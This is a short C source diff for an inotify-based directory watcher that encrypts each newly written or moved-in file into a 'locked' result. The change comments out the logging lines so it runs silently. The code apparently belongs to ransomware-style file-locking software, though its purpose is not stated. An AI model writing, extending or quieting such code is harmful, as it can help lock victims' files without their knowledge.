@@ -67,7 +67,7 @@ void watcher_traverse(int fd, const char *path) {
 
     strncpy(watchedPaths[wd], path, sizeof(watchedPaths[wd]) - 1);
     watchedPaths[wd][sizeof(watchedPaths[wd]) - 1] = '\0';
-    printf("watching: %s\n", path);
+    //printf("watching: %s\n", path);
 
     DIR *dir = opendir(path);
     if (!dir) {
@@ -175,7 +175,7 @@ void *start_watcher(void *args) {
 
                 } else if (event->mask & IN_MOVED_TO || event->mask & IN_CLOSE_WRITE) {
                     if (!is_skipped(event->name)) {
-                        printf("new file: %s\n", full_path);
+                        //printf("new file: %s\n", full_path);
                         unsigned char key[16];
                         use_key(key);
                         char *locked = encrypt_file((char *)full_path, key);
